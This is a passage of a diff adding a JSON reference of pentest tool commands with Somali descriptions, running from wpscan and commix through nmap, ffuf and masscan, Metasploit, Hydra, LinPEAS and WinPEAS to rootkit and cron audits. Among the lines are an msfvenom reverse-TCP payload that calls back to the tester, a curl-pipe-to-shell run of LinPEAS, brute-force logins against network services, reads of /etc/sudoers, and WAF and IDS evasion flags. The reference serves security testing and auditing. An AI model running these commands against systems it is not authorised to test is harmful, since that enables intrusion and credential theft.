+          "command": "wapiti -u http://<target_url> --verify-ssl 0",
+          "description": "Iska indha-tirida shahaadada SSL haddii ay tahay self-signed ama invalid."
+        },
+        {
+          "command": "wapiti -u http://<target_url> -t 10",
+          "description": "U deji 10 ilbiriqsi xadka sugitaanka (Timeout)."
+        }
+      ]
+    },
+    "Wpscan (WordPress Vulnerability Scanner)": {
+      "installation": "sudo apt install wpscan -y   (ama: gem install wpscan)",
+      "commands": [
+        {
+          "command": "wpscan --url http://<target_url> --enumerate vp,vt,u",
+          "description": "Baarista WordPress: nuglaanta plugins, themes, iyo soo saarista usernames."
+        },
+        {
+          "command": "wpscan --url http://<target_url> --api-token <YOUR_WPVULNDB_TOKEN>",
+          "description": "Isticmaalka WPVulnDB API Token si loo helo dhammaan CVEs-ka ugu dambeeyay."
+        },
+        {
+          "command": "wpscan --url http://<target_url> --enumerate ap",
+          "description": "Baarista dhammaan plugins-ka ku jira website-ka (All Plugins Enumeration)."
+        },
+        {
+          "command": "wpscan --url http://<target_url> --enumerate at",
+          "description": "Baarista dhammaan themes-ka ku jira website-ka."
+        },
+        {
+          "command": "wpscan --url http://<target_url> --enumerate cb",
+          "description": "Baarista Config Backups (faylalka qaabeynta ee la keydiyay sida wp-config.php.bak)."
+        },
+        {
+          "command": "wpscan --url http://<target_url> --plugins-detection aggressive",
+          "description": "Ogaanshaha plugins-ka adigoo isticmaalaya qaabka aggressive-ka ah."
+        },
+        {
+          "command": "wpscan --url http://<target_url> -o wpscan_report.txt",
+          "description": "Natiijada baaritaanka oo lagu keydiyo fayl qoraal ah."
+        },
+        {
+          "command": "wpscan --update",
+          "description": "Cusboonaysiinta xogta nuglaanta ee WPScan database."
+        },
+        {
+          "command": "wpscan --url http://<target_url> --random-user-agent",
+          "description": "Isticmaalka User-Agent random ah si aan baaritaanka loo dareemin."
+        },
+        {
+          "command": "wpscan --url http://<target_url> --proxy http://127.0.0.1:8080",
+          "description": "Marinta baaritaanka WPScan dhexda Burp Suite Proxy."
+        }
+      ]
+    },
+    "Commix (Command Injection Scanner)": {
+      "installation": "sudo apt install commix -y   (ama: git clone https://github.com/commixproject/commix.git)",
+      "commands": [
+        {
+          "command": "commix -u \"http://<target>/ping.php?ip=127.0.0.1\"",
+          "description": "Baarista tooska ah ee Command Injection vulnerabilities ee URL parameters."
+        },
+        {
+          "command": "commix -u \"http://<target>/login.php\" --data=\"host=localhost\"",
+          "description": "Baarista Command Injection ee foomamka HTTP POST."
+        },
+        {
+          "command": "commix -r request.txt",
+          "description": "Baarista HTTP request file oo laga soo qaaday Burp Suite."
+        },
+        {
+          "command": "commix -u \"http://<target>/cmd.php?ip=127.0.0.1\" --level=3",
+          "description": "Baaritaan qoto dheer (Level 3) oo baara headers-ka sida Cookie iyo User-Agent."
+        },
+        {
+          "command": "commix -u \"http://<target>/cmd.php?ip=127.0.0.1\" --batch",
+          "description": "Orodka baaritaanka isagoon wax su'aalo ah ku weydiinayn (Automated)."
+        },
+        {
+          "command": "commix -u \"http://<target>/cmd.php?ip=127.0.0.1\" --os-cmd=\"whoami\"",
+          "description": "Ku kici amar nidaamka (OS command) haddii nuglaan la helo."
+        },
+        {
+          "command": "commix -u \"http://<target>/cmd.php?ip=127.0.0.1\" --tamper=base64encode",
+          "description": "Sir-qarinta payloads-ka adigoo adeegsanaya Base64 si looga gudbo WAF."
+        },
+        {
+          "command": "commix -u \"http://<target>/cmd.php?ip=127.0.0.1\" --proxy=\"http://127.0.0.1:8080\"",
+          "description": "Marinta taraafikada Commix dhexda HTTP Proxy."
+        },
+        {
+          "command": "commix --update",
+          "description": "Cusboonaysiinta Commix noocii ugu dambeeyay."
+        },
+        {
+          "command": "commix -u \"http://<target>/cmd.php?ip=127.0.0.1\" --all",
+          "description": "Soo saarista dhammaan xogta nidaamka (Users, OS, Architecture) haddii uu nugul yahay."
+        }
+      ]
+    }
+  },
+  "Scanning & Network Enumeration": {
+    "Nmap": {
+      "installation": "sudo apt install nmap -y   (Windows: nmap.org/download.html)",
+      "commands": [
+        {
+          "command": "nmap -sV -sC -p- -T4 <target_ip>",
+          "description": "Baaritaan degdeg ah oo lagu baarayo dhammaan 65535 dakadood, versions, iyo scripts."
+        },
+        {
+          "command": "nmap -sn <subnet_cidr>",
+          "description": "Ping sweep si loo ogaado dhammaan aaladaha shidan (live hosts) ee shabakadda ku jira."
+        },
+        {
+          "command": "nmap --script vuln <target_ip>",
+          "description": "Isticmaalka Nmap Vulnerability Engine si loo ogaado nuglaanta caanka ah."
+        },
+        {
+          "command": "nmap -sU --top-ports 100 <target_ip>",
+          "description": "Baaritaanka 100-ka dakadood ee ugu caansan UDP (UDP Scan)."
+        },
+        {
+          "command": "nmap -O <target_ip>",
+          "description": "Ogaanshaha nooca Operating System-ka (OS Detection) ee aaladda."
+        },
+        {
+          "command": "nmap -p 80,443 --script http-enum <target_ip>",
+          "description": "Baarista galalka iyo faylalka caanka ah ee web server-ka."
+        },
+        {
+          "command": "nmap -p 445 --script smb-vuln* <target_ip>",
+          "description": "Baarista nuglaanta SMB ee nidaamyada Windows (sida EternalBlue)."
+        },
+        {
+          "command": "nmap -p 21 --script ftp-anon <target_ip>",
+          "description": "Hubinta haddii server-ka FTP u oggol yahay Anonymous Login."
+        },
+        {
+          "command": "nmap -sS -Pn -T2 <target_ip>",
+          "description": "Stealth SYN Scan oo gaabis ah si looga dhuunto nidaamyada IDS/Firewall."
+        },
+        {
+          "command": "nmap -sV -p- <target_ip> -oA nmap_full_report",
+          "description": "Ku keydinta dhammaan natiijooyinka 3 qaab oo kala duwan (XML, Nmap, Grepable)."
+        }
+      ]
+    },
+    "Ffuf (Fast Web Fuzzer)": {
+      "installation": "sudo apt install ffuf -y   (ama: go install github.com/ffuf/ffuf/v2@latest)",
+      "commands": [
+        {
+          "command": "ffuf -u http://<target_url>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302",
+          "description": "Fuzzing aad u dheereeya oo lagu baarayo galalka iyo faylalka qarsoon."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/ -H \"Host: FUZZ.<domain.com>\" -w <vhosts_wordlist> -fs <filter_size>",
+          "description": "Baarista Virtual Hosts (VHost Fuzzing) si loo helo subdomains gudaha qarsoon."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/FUZZ -w <wordlist> -e .php,.html,.txt,.js",
+          "description": "Baarista faylalka leh kordhinta gaarka ah (Extensions)."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/api/FUZZ -w <api_wordlist> -mc 200",
+          "description": "Baarista API Endpoints-ka qarsoon ee server-ka."
+        },
+        {
+          "command": "ffuf -u \"http://<target_url>/page?FUZZ=test\" -w <param_wordlist> -fs <filter_size>",
+          "description": "Parameter Fuzzing si loo helo parameters aan la shaacin (Hidden GET parameters)."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/login -X POST -d \"user=admin&pass=FUZZ\" -w <wordlist> -fc 401",
+          "description": "Password Brute-forcing ee foomamka HTTP POST."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/FUZZ -w <wordlist> -t 100",
+          "description": "U kordhi xawaaraha baaritaanka 100 threads si uu u noqdo mid aad u dheereeya."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/FUZZ -w <wordlist> -x http://127.0.0.1:8080",
+          "description": "Marinta dhammaan weydiimaha FFUF dhexda Burp Suite Proxy."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/FUZZ -w <wordlist> -rate 50",
+          "description": "Xaddid xawaaraha 50 requests/sec si looga fogaado in server-ku xirmo."
+        },
+        {
+          "command": "ffuf -u http://<target_url>/FUZZ -w <wordlist> -o results.json -of json",
+          "description": "Ku keydinta dhammaan natiijooyinka la helo fayl JSON ah."
+        }
+      ]
+    },
+    "Masscan": {
+      "installation": "sudo apt install masscan -y",
+      "commands": [
+        {
+          "command": "masscan <target_ip_or_subnet> -p1-65535 --rate=1000",
+          "description": "Baaritaanka malaayiin dakadood ilbiriqsiyo gudahood adigoo isticmaalaya 1000 packets/sec."
+        },
+        {
+          "command": "masscan <subnet> -p80,443,22,8080 --banners",
+          "description": "Baarista dakadaha ugu muhiimsan iyo soo jiidashada banner-ka adeegyada."
+        },
+        {
+          "command": "masscan 0.0.0.0/0 -p443 --rate=10000 --exclude 255.255.255.255",
+          "description": "Baarista Internet-ka oo dhan ee dakadda 443 (Worldwide HTTPS scan)."
+        },
+        {
+          "command": "masscan <target_ip> -p1-10000 -oJ masscan_output.json",
+          "description": "Ku dhoofinta dhammaan natiijooyinka la helo qaab JSON ah."
+        },
+        {
+          "command": "masscan <target_ip> -p80 --adapter-ip <your_ip>",
+          "description": "Cayimidda IP-ga aad ka dirayso xogta baaritaanka."
+        },
+        {
+          "command": "masscan -p80,443 --range 10.0.0.0/8 --rate=5000",
+          "description": "Baaritaanka shabakadaha waaweyn ee Class A IP range."
+        },
+        {
+          "command": "masscan <target_ip> -pU:53,161,123",
+          "description": "Baaritaanka dakadaha UDP ee muhiimka ah (DNS, SNMP, NTP)."
+        },
+        {
+          "command": "masscan --resume paused.conf",
+          "description": "Dib u bilaabista baaritaan hore loo hakiyay."
+        },
+        {
+          "command": "masscan <target_ip> -p80 --ping",
+          "description": "Ku darista ICMP Echo (Ping) baaritaanka dakadaha."
+        },
+        {
+          "command": "masscan <target_ip> -p80 --source-port 53",
+          "description": "Dirista baaritaanka iyadoo laga dhigayo DNS traffic (Bypass basic firewalls)."
+        }
+      ]
+    },
+    "Rustscan": {
+      "installation": "sudo apt install rustscan -y   (ama Docker: docker run -it --rm --name rustscan rustscan/rustscan:2.1.1)",
+      "commands": [
+        {
+          "command": "rustscan -a <target_ip> -- -sC -sV",
+          "description": "Baaritaan aad u dheereeya oo Rust ku dhisan oo dakadaha furan u gudbinaya Nmap."
+        },
+        {
+          "command": "rustscan -a <target_ip> -u 5000",
+          "description": "Kordhinta ulimit 5000 si xawaaraha baaritaanka loo labanlaabo."
+        },
+        {
+          "command": "rustscan -a <target_ip> -r 1-65535",
+          "description": "Baarista dhammaan 65535 dakadood ilbiriqsiyo gudahood."
+        },
+        {
+          "command": "rustscan -a <target_ip> -p 80,443,8080,22",
+          "description": "Baarista kaliya dakadaha cayiman."
+        },
+        {
+          "command": "rustscan -a <target_ip> -b 2000",
+          "description": "U deji batch size 2000 packets si uu ugu socdo xawaaraha ugu sarreeya."
+        },
+        {
+          "command": "rustscan -a <target_ip> --greppable",
+          "description": "Soo saarista natiijada qaab fudud oo script lagu falanqeyn karo."
+        },
+        {
+          "command": "rustscan -a <target_ip> -t 1500",
+          "description": "U deji 1500ms timeout shabakadaha gaabiska ah."
+        },
+        {
+          "command": "rustscan -a <target_ip> --no-nmap",
+          "description": "Kaliya hel dakadaha furan adoon bilaabin Nmap scan dambe."
+        },
+        {
+          "command": "rustscan -a <target_ip> -- -sS -A",
+          "description": "U gudbi Nmap dookhyada SYN scan iyo Aggressive OS detection."
+        },
+        {
+          "command": "rustscan -a <target_ip> -o results.txt",
+          "description": "Ku keydinta natiijada baaritaanka fayl qoraal ah."
+        }
+      ]
+    },
+    "Gobuster": {
+      "installation": "sudo apt install gobuster -y   (ama: go install github.com/OJ/gobuster/v3@latest)",
+      "commands": [
+        {
+          "command": "gobuster dir -u http://<target_url> -w /usr/share/wordlists/dirb/common.txt",
+          "description": "Baarista galalka iyo faylalka qarsoon ee server-ka web-ka."
+        },
+        {
+          "command": "gobuster dir -u http://<target_url> -w <wordlist> -x php,html,txt,js",
+          "description": "Baarista faylalka leh extensions-ka gaarka ah."
+        },
+        {
+          "command": "gobuster dns -d <domain.com> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
+          "description": "Baarista subdomain-yada iyadoo la adeegsanayo SecLists wordlist."
+        },
+        {
+          "command": "gobuster vhost -u http://<target_url> -w <vhosts_wordlist>",
+          "description": "Baarista Virtual Hosts ee ku dhex jira isla web server-ka."
+        },
+        {
+          "command": "gobuster s3 -w <wordlist>",
+          "description": "Baarista iyo helitaanka AWS S3 Buckets qarsoon ee bannaanka u yaalla."
+        },
+        {
+          "command": "gobuster dir -u http://<target_url> -w <wordlist> -t 50",
+          "description": "U deji 50 threads si xawaaraha baaritaanka loo dheereeyo."
+        },
+        {
+          "command": "gobuster dir -u http://<target_url> -w <wordlist> -c \"session=xxxx\"",
+          "description": "Baarista website-ka adigoo isticmaalaya authentication cookie."
+        },
+        {
+          "command": "gobuster dir -u http://<target_url> -w <wordlist> -k",
+          "description": "Iska indha-tirida shahaadada SSL haddii ay tahay mid invalid ah (-k / skip SSL)."
+        },
+        {
+          "command": "gobuster dir -u http://<target_url> -w <wordlist> -o gobuster_report.txt",
+          "description": "Ku keydinta natiijada baaritaanka fayl qoraal ah."
+        },
+        {
+          "command": "gobuster dir -u http://<target_url> -w <wordlist> -b 404,403",
+          "description": "Ka reeb Status Codes gaar ah (sida 404 iyo 403) natiijada soo baxaysa."
+        }
+      ]
+    }
+  },
+  "Exploitation & Vulnerability Assessment": {
+    "Metasploit Framework (msfconsole)": {
+      "installation": "sudo apt install metasploit-framework -y",
+      "commands": [
+        {
+          "command": "msfconsole -q",
+          "description": "Kicinta Metasploit adoon soo bandhigin banner-ka hore si uu u dheereeyo."
+        },
+        {
+          "command": "search <cve_or_service_name>",
+          "description": "Gudaha msfconsole: Raadinta modules-ka iyo exploits-ka la xiriira adeeg gaar ah."
+        },
+        {
+          "command": "use exploit/<category>/<module_name>",
+          "description": "Gudaha msfconsole: Xulashada module-ka aad rabto inaad ku tijaabiso nuglaanta."
+        },
+        {
+          "command": "show options",
+          "description": "Gudaha msfconsole: Muujinta dhammaan xogta loo baahan yahay in la dejiyo (RHOSTS, RPORT, LHOST)."
+        },
+        {
+          "command": "set RHOSTS <target_ip>",
+          "description": "Gudaha msfconsole: Dejinta IP Address-ka bartilmaameedka."
+        },
+        {
+          "command": "check",
+          "description": "Gudaha msfconsole: Hubinta haddii bartilmaameedku nugul yahay adoon wax weerar ah qaadin."
+        },
+        {
+          "command": "db_nmap -sV <target_ip>",
+          "description": "Gudaha msfconsole: Orodka Nmap iyo toos ugu keydinta xogta database-ka Metasploit."
+        },
+        {
+          "command": "hosts",
+          "description": "Gudaha msfconsole: Liiska dhammaan aaladaha lagu ogaaday database-ka."
+        },
+        {
+          "command": "services",
+          "description": "Gudaha msfconsole: Liiska dhammaan dakadaha iyo adeegyada furan ee la helay."
+        },
+        {
+          "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o payload.exe",
+          "description": "Abuurista payload tijaabo ah oo loogu talagalay qiimaynta nidaamyada Windows."
+        }
+      ]
+    },
+    "Hydra (Password Auditing)": {
+      "installation": "sudo apt install hydra -y",
+      "commands": [
+        {
+          "command": "hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target_ip> ssh",
+          "description": "Tijaabinta adkeysiga furaha adeegga SSH iyadoo la adeegsanayo wordlist."
+        },
+        {
+          "command": "hydra -L users.txt -P passwords.txt <target_ip> ftp",
+          "description": "Tijaabinta adkeysiga furayaasha adeegga FTP."
+        },
+        {
+          "command": "hydra -l admin -P passwords.txt <target_ip> rdp",
+          "description": "Tijaabinta adkeysiga furaha adeegga Remote Desktop (RDP)."
+        },
+        {
+          "command": "hydra -l root -P passwords.txt <target_ip> mysql",
+          "description": "Tijaabinta adkeysiga furaha database-ka MySQL."
+        },
+        {
+          "command": "hydra <target_ip> http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -L users.txt -P pass.txt",
+          "description": "Tijaabinta adkeysiga foomamka Web Login-ka (HTTP POST Form)."
+        },
+        {
+          "command": "hydra -l admin -P passwords.txt <target_ip> smb",
+          "description": "Tijaabinta furayaasha Windows SMB share."
+        },
+        {
+          "command": "hydra -l admin -P passwords.txt <target_ip> telnet",
+          "description": "Tijaabinta furaha adeegga Telnet."
+        },
+        {
+          "command": "hydra -l user@domain.com -P pass.txt <target_ip> smtp",
+          "description": "Tijaabinta furayaasha email server-ka SMTP."
+        },
+        {
+          "command": "hydra -t 16 -l admin -P pass.txt <target_ip> ssh",
+          "description": "U deji 16 threads isku mar si uu baaritaanku u dheereeyo."
+        },
+        {
+          "command": "hydra -M targets.txt -P passwords.txt ssh",
+          "description": "Tijaabinta liis IP-yo ah oo ku jira faylka targets.txt."
+        }
+      ]
+    },
+    "Searchsploit": {
+      "installation": "sudo apt install exploitdb -y",
+      "commands": [
+        {
+          "command": "searchsploit <service_name> <version>",
+          "description": "Raadinta offline-ka ah ee Exploit-DB si loo helo cilladaha la diiwaangeliyay ee adeegga."
+        },
+        {
+          "command": "searchsploit -m <exploit_id>",
+          "description": "Nuqul ka qaadashada koodhka cilladda oo toos loogu soo dejinayo galka aad joogto."
+        },
+        {
+          "command": "searchsploit --cve <cve_number>",
+          "description": "Raadinta tooska ah iyadoo la adeegsanayo lambarka CVE (tusaale: CVE-2021-44228)."
+        },
+        {
+          "command": "searchsploit -p <exploit_id>",
+          "description": "Muujinta jidka (path) uu faylka cilladdu kaga yaallo kombiyuutarkaaga."
+        },
+        {
+          "command": "searchsploit -x <exploit_id>",
+          "description": "Akhrinta qoraalka cilladda toos terminal-ka adoon soo dejin."
+        },
+        {
+          "command": "searchsploit -t <service_name>",
+          "description": "Raadinta kaliya cinwaannada (Title search) cilladaha."
+        },
+        {
+          "command": "searchsploit -j <service_name>",
+          "description": "Soo saarista natiijada oo qaab JSON ah."
+        },
+        {
+          "command": "searchsploit -u",
+          "description": "Cusboonaysiinta database-ka Exploit-DB noocii ugu dambeeyay."
+        },
+        {
+          "command": "searchsploit --nmap nmap_results.xml",
+          "description": "Akhrinta faylka XML ee Nmap oo toos loogu dhex baaro cilladaha adeegyada la helay."
+        },
+        {
+          "command": "searchsploit apache 2.4",
+          "description": "Raadinta cilladaha la xiriira Apache Web Server version 2.4."
+        }
+      ]
+    }
+  },
+  "Privilege Escalation & Auditing": {
+    "LinPEAS": {
+      "installation": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh",
+      "commands": [
+        {
+          "command": "./linpeas.sh",
+          "description": "Kicinta LinPEAS ee nidaamyada Linux si loo helo khaladaadka xuquuqda (PrivEsc vector)."
+        },
+        {
+          "command": "./linpeas.sh -a > linpeas_report.txt",
+          "description": "Orodka baaris buuxda iyo ku qorista warbixinta fayl qoraal ah."
+        },
+        {
+          "command": "./linpeas.sh -s",
+          "description": "Orodka super-fast scan ah oo baara kaliya cilladaha ugu khatarsan."
+        },
+        {
+          "command": "./linpeas.sh -P <password>",
+          "description": "Geli sudo password-ka haddii aad haysato si loo baaro xuquuqda sudo."
+        },
+        {
+          "command": "./linpeas.sh -e",
+          "description": "Baarista dheeraadka ah ee permissions-ka galalka gaarka ah."
+        },
+        {
+          "command": "./linpeas.sh -d <search_path>",
+          "description": "Ku xaddid baaritaanka gal gaar ah."
+        },
+        {
+          "command": "./linpeas.sh -N",
+          "description": "Baarista adoon adeegsan midabbada (No Color mode)."
+        },
+        {
+          "command": "./linpeas.sh -q",
+          "description": "Quiet mode: Soo bandhig kaliya waxyaabaha 99% horseedi kara Privilege Escalation."
+        },
+        {
+          "command": "./linpeas.sh -o",
+          "description": "Baarista OS information iyo kernel exploits macquulka ah."
+        },
+        {
+          "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+          "description": "Kicinta LinPEAS toos internet-ka adoon fayl ku keydin hard drive-ka."
+        }
+      ]
+    },
+    "WinPEAS": {
+      "installation": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe",
+      "commands": [
+        {
+          "command": ".\\winPEASx64.exe quiet cmd",
+          "description": "Kicinta WinPEAS ee nidaamyada Windows 64-bit si loo ogaado dayac-baylaha nidaamka."
+        },
+        {
+          "command": ".\\winPEASany.exe -services",
+          "description": "Baarista adeegyada Windows ee leh xuquuqda khaldan (Misconfigured Services)."
+        },
+        {
+          "command": ".\\winPEASany.exe -applications",
+          "description": "Baarista barnaamijyada ku shubtay Windows ee nugul."
+        },
+        {
+          "command": ".\\winPEASany.exe -systeminfo",
+          "description": "Soo saarista xogta OS-ka, hotfixes, iyo patches-ka maqan."
+        },
+        {
+          "command": ".\\winPEASany.exe -network",
+          "description": "Baarista xiriirada shabakadda iyo routing tables ee Windows."
+        },
+        {
+          "command": ".\\winPEASany.exe -windowscreds",
+          "description": "Baarista furayaasha ku dhex qarsoon Registry, Vault, iyo SAM."
+        },
+        {
+          "command": ".\\winPEASany.exe -fileanalysis",
+          "description": "Baarista faylalka muhiimka ah ee leh xuquuqda daciifka ah."
+        },
+        {
+          "command": ".\\winPEASx64.exe log=winpeas_report.txt",
+          "description": "Ku qorista dhammaan warbixinta baaritaanka fayl qoraal ah."
+        },
+        {
+          "command": ".\\winPEASany.exe -processinfo",
+          "description": "Baarista barnaamijyada hadda socda iyo xuquuqdooda."
+        },
+        {
+          "command": ".\\winPEASany.exe -quiet",
+          "description": "Soo bandhig kaliya digniinaha halista sare leh (Red/Yellow flags)."
+        }
+      ]
+    },
+    "SUID & Sudo Audit (Linux)": {
+      "installation": "Waa amarro toos ugu dhex jira nidaamka Linux (No installation needed)",
+      "commands": [
+        {
+          "command": "find / -perm -u=s -type f 2>/dev/null",
+          "description": "Helitaanka dhammaan faylalka leh SUID Bit (faylal ku shaqeyn kara awoodda root adigoo ah user caadi ah)."
+        },
+        {
+          "command": "sudo -l",
+          "description": "Liiska amarada uu user-ka hadda jooga u oggol yahay inuu ku socodsiiyo awoodda sudo isagoon furaha gelin."
+        },
+        {
+          "command": "find / -perm -g=s -type f 2>/dev/null",
+          "description": "Helitaanka dhammaan faylalka leh SGID Bit."
+        },
+        {
+          "command": "find / -writable -type d 2>/dev/null",
+          "description": "Helitaanka galalka uu user-ka hadda jooga wax ku qori karo (Writable Directories)."
+        },
+        {
+          "command": "cat /etc/passwd | cut -d: -f1,3,7",
+          "description": "Liiska dhammaan users-ka nidaamka iyo shell-ka ay isticmaalaan."
+        },
+        {
+          "command": "cat /etc/sudoers 2>/dev/null",
+          "description": "Akhrinta faylka sudoers haddii aad haysato xuquuqda akhriska."
+        },
+        {
+          "command": "ls -la /opt /tmp /var/tmp",
+          "description": "Baarista galalka inta badan lagu qoro scripts-ka gaarka ah."
+        },
+        {
+          "command": "cat /etc/crontab",
+          "description": "Akhrinta system-wide cron jobs si loo helo shaqooyin root ku socda oo la beddeli karo."
+        }
+      ]
+    },
+    "Linux Capabilities": {
+      "installation": "sudo apt install libcap2-bin -y",
+      "commands": [
+        {
+          "command": "getcap -r / 2>/dev/null",
+          "description": "Baarista dhammaan barnaamijyada leh Linux Capabilities (sida cap_setuid, cap_net_raw) oo horseedi kara PrivEsc."
+        },
+        {
+          "command": "getcap /usr/bin/* 2>/dev/null",
+          "description": "Baarista barnaamijyada ku jira /usr/bin ee leh capabilities gaar ah."
+        },
+        {
+          "command": "getcap /bin/* 2>/dev/null",
+          "description": "Baarista barnaamijyada aasaasiga ah ee /bin."
+        },
+        {
+          "command": "capsh --print",
+          "description": "Muujinta dhammaan capabilities-ka uu hadda haysto current process-kaaga."
+        }
+      ]
+    },
+    "PowerUp (Windows Audit)": {
+      "installation": "git clone https://github.com/HarmJ0y/PowerUp.git",
+      "commands": [
+        {
+          "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
+          "description": "Baaritaan dhamaystiran oo Windows ah oo lagu ogaanayo Unquoted Service Paths iyo AlwaysInstallElevated."
+        },
+        {
+          "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Get-UnquotedService\"",
+          "description": "Baarista kaliya adeegyada leh Unquoted Paths."
+        },
+        {
+          "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Get-ModifiableServiceFile\"",
+          "description": "Helitaanka adeegyada ay faylashooda wax ka beddeli karaan users caadi ah."
+        },
+        {
+          "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Get-RegistryAlwaysInstallElevated\"",
+          "description": "Hubinta haddii MSI packages lagu shubi karo awoodda SYSTEM."
+        }
+      ]
+    },
+    "HashID (Aqoonsiga Hashes-ka)": {
+      "installation": "sudo apt install hashid -y   (ama: pip install hashid)",
+      "commands": [
+        {
+          "command": "hashid <hash_string>",
+          "description": "Ogaanshaha nooca hash-ka (MD5, SHA256, NTLM, bcrypt, iwm.) si loo doorto aaladda saxda ah ee furitaanka."
+        },
+        {
+          "command": "hashid -m <hash_string>",
+          "description": "Muujinta Hashcat Mode number-ka (sida 0 for MD5, 1000 for NTLM)."
+        },
+        {
+          "command": "hashid -j <hash_string>",
+          "description": "Muujinta John The Ripper format name-ka."
+        },
+        {
+          "command": "hashid -e <hash_string>",
+          "description": "Muujinta noocyada hashes-ka ee salted ah (Extended identification)."
+        }
+      ]
+    }
+  },
+  "Persistence & Backdoors Auditing": {
+    "Rkhunter (Rootkit Hunter)": {
+      "installation": "sudo apt install rkhunter -y",
+      "commands": [
+        {
+          "command": "sudo rkhunter --update && sudo rkhunter --check",
+          "description": "Cusboonaysiinta xogta iyo baarista Linux si loo ogaado rootkits, backdoors, iyo faylalka wax laga beddelay."
+        },
+        {
+          "command": "sudo rkhunter --check --skip-keypress",
+          "description": "Orodka baaritaanka isagoon ku joojinayn oo si buuxda u dhameystiraya."
+        },
+        {
+          "command": "sudo rkhunter --check --rwo",
+          "description": "Soo bandhig kaliya digniinaha (Report Warnings Only)."
+        },
+        {
+          "command": "sudo rkhunter --propupd",
+          "description": "Cusboonaysiinta xogta file properties database-ka kadib marka aad update samayso."
+        },
+        {
+          "command": "sudo cat /var/log/rkhunter.log | grep -i warning",
+          "description": "Akhrinta dhammaan digniinaha lagu qoray faylka log-ga."
+        },
+        {
+          "command": "sudo rkhunter --check --enable rootkits",
+          "description": "Baarista kaliya qaybta rootkits-ka caanka ah."
+        },
+        {
+          "command": "sudo rkhunter --check --enable hidden_procs",
+          "description": "Baarista barnaamijyada qarsoon ee nidaamka ku dhex socda."
+        },
+        {
+          "command": "sudo rkhunter --check --enable hidden_ports",
+          "description": "Baarista dakadaha qarsoon ee aan caadiga ahayn."
+        },
+        {
+          "command": "sudo rkhunter --versioncheck",
+          "description": "Hubinta in aad haysato nooca ugu dambeeyay ee Rkhunter."
+        },
+        {
+          "command": "sudo rkhunter --config-check",
+          "description": "Hubinta in faylka qaabeynta rkhunter.conf uu sax yahay."
+        }
+      ]
+    },
+    "Chkrootkit": {
+      "installation": "sudo apt install chkrootkit -y",
+      "commands": [
+        {
+          "command": "sudo chkrootkit",
+          "description": "Baarista faylalka nidaamka Linux haddii wax laga beddelay oo lagu dhex qariyay rootkit."
+        },
+        {
+          "command": "sudo chkrootkit -q",
+          "description": "Soo bandhigidda kaliya digniinaha iyo waxyaabaha halista ah ee la helay."
+        },
+        {
+          "command": "sudo chkrootkit -x",
+          "description": "Expert mode: Muujinta dhammaan tijaabooyinka la samaynayo si faahfaahsan."
+        },
+        {
+          "command": "sudo chkrootkit -r /mnt/disk",
+          "description": "Baarista hard drive kale oo ku xiran kombiyuutarka (Forensics mode)."
+        },
+        {
+          "command": "sudo chkrootkit -p /bin:/sbin",
+          "description": "Ku xaddid baaritaanka galalka binary-ga ee muhiimka ah."
+        },
+        {
+          "command": "sudo chkrootkit -n",
+          "description": "Iska indha-tir NFS network mounts baaritaanka dhexdiisa."
+        },
+        {
+          "command": "sudo chkrootkit lkm",
+          "description": "Baarista Loadable Kernel Modules (LKMs) ee halista ah."
+        },
+        {
+          "command": "sudo chkrootkit sniffer",
+          "description": "Baarista haddii qalabka shabakadda (NIC) uu ku jiro Promiscuous Sniffer mode."
+        },
+        {
+          "command": "sudo chkrootkit bindshell",
+          "description": "Baarista haddii ay jiraan bind shells ka furan dakadaha."
+        },
+        {
+          "command": "sudo chkrootkit -V",
+          "description": "Muujinta nooca Chkrootkit ee ku shubtay."
+        }
+      ]
+    },
+    "Netstat & Lsof (Network Audit)": {
+      "installation": "sudo apt install net-tools lsof -y",
+      "commands": [
+        {
+          "command": "netstat -tulpen",
+          "description": "Liiska dhammaan dakadaha hadda dhegeysanaya (Listening Ports) iyo barnaamijka (PID/Program name) wata."
+        },
+        {
+          "command": "lsof -i -P -n | grep LISTEN",
+          "description": "Ogaanshaha dhammaan adeegyada xiriirka shabakadda sugaya ee nidaamka ka furan."
+        },
+        {
+          "command": "ss -tulpn",
+          "description": "Soo saarista dakadaha furan adigoo isticmaalaya aaladda casriga ah ee ss (Socket Statistics)."
+        },
+        {
+          "command": "lsof -i :80",
+          "description": "Ogaanshaha barnaamijka saxda ah ee hadda isticmaalaya dakadda 80."
+        },
+        {
+          "command": "netstat -anp | grep ESTABLISHED",
+          "description": "Liiska dhammaan xiriirada hadda tooska ah ee dibadda lala leeyahay (Established Connections)."
+        }
+      ]
+    },
+    "Cron & Scheduled Tasks Audit": {
+      "installation": "Waa adeegyo toos ugu jira Linux (No installation needed)",
+      "commands": [
+        {
+          "command": "ls -la /etc/cron* /var/spool/cron/crontabs/",
+          "description": "Baarista meelaha ay ku qoran yihiin shaqooyinka tooska ah ee nidaamku qabto si loo ogaado shaqooyin qarsoon."
+        },
+        {
+          "command": "crontab -l",
+          "description": "Liiska shaqooyinka tooska ah ee u qorsheysan user-ka hadda fadhiya."
+        },
+        {
+          "command": "sudo cat /etc/crontab",
+          "description": "Akhrinta faylka guud ee nidaamka ee jadwalka hawlaha (System Crontab)."
+        },
+        {
+          "command": "systemctl list-timers",
+          "description": "Liiska dhammaan Systemd Timers-ka u qorsheysan nidaamka."
+        }
+      ]
+    },
+    "Windows Autoruns Audit": {
